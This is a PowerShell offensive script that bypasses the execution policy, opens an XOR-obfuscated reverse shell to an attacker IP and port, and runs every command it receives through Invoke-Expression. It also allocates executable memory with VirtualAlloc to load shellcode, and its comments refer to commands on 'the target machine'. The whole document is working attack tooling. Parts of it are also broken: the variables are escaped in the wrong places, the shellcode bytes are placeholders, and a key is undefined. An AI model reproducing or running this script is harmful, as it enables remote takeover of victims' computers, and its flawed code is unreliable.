# Save the original execution policy
$originalPolicy = Get-ExecutionPolicy

# Temporarily set the execution policy to Bypass
Set-ExecutionPolicy Bypass -Scope Process -Force

# Your reverse shell code goes here (Replace 'YOUR_IP_ADDRESS' and '1234' with your IP and port)
$reverseShellCode = @"
\$ip = "YOUR_IP_ADDRESS"
\$port = 1234

# Add XOR key for encoding/decoding
\$key = 0xAA

\$client = New-Object System.Net.Sockets.TcpClient(\$ip, \$port)
\$stream = \$client.GetStream()

\$reader = New-Object System.IO.StreamReader(\$stream)
\$writer = New-Object System.IO.StreamWriter(\$stream)

# Run a loop to continuously read and execute commands from the server
while (\$client.Connected) {
    try {
        # Read the command from the server
        \$command = \$reader.ReadLine()

        # XOR decode the command
        \$decodedCommand = ""
        foreach (\$char in \$command.ToCharArray()) {
            \$decodedChar = [char]([byte]\$char -bxor \$key)
            \$decodedCommand += \$decodedChar
        }

        # Execute the decoded command using PowerShell
        \$output = Invoke-Expression -Command \$decodedCommand

        # Send the output of the command back to the server
        \$writer.WriteLine(\$output)
        \$writer.Flush()
    } catch {
        # If there's an error, break the loop and close the connection
        break
    }
}

# Close the client connection
\$client.Close()
"@

# Add your new encoded shellcode here (generated from a reverse shell payload)
[Byte[]] \$var1 = 0xXX, 0xXX, 0xXX, ...

# Perform XOR encoding on the shellcode
\$encodedShellcode = @()
foreach (\$byte in \$var1) {
    \$encodedByte = \$byte -bxor \$key
    \$encodedShellcode += \$encodedByte
}

\$size = 0x1000
if (\$encodedShellcode.Length -gt 0x1000) { \$size = \$encodedShellcode.Length }

\$Win32Functions = @"
using System;
using System.Runtime.InteropServices;

namespace Win32Functions
{
    public class iWin32
    {
        [DllImport("kernel32", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("msvcrt", EntryPoint = "memset", CallingConvention = CallingConvention.Cdecl)]
        public static extern IntPtr memset(IntPtr dest, byte value, uint size);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);
    }
}
"@

# Add the Win32Functions type to the PowerShell session
Add-Type -TypeDefinition \$Win32Functions

\$var2 = [Win32Functions.iWin32]

\$addr = [IntPtr]::Zero
\$x = \$var2::VirtualAlloc(\$addr, \$size, 0x3000, 0x40)
for (\$i = 0; \$i -lt \$encodedShellcode.Length; \$i++) {
    \$var2::memset([IntPtr](\$x.ToInt64() + \$i), \$encodedShellcode[\$i], 1)
}

# Execute your reverse shell code
Invoke-Expression \$reverseShellCode

# Prevent the script from exiting immediately
for (;;) {
    Start-Sleep 60
    # Add any additional commands you want to execute on the target machine here
}

# Restoring the execution policy to its original value after shellcode execution
Set-ExecutionPolicy -ExecutionPolicy \$originalPolicy -Scope Process -Force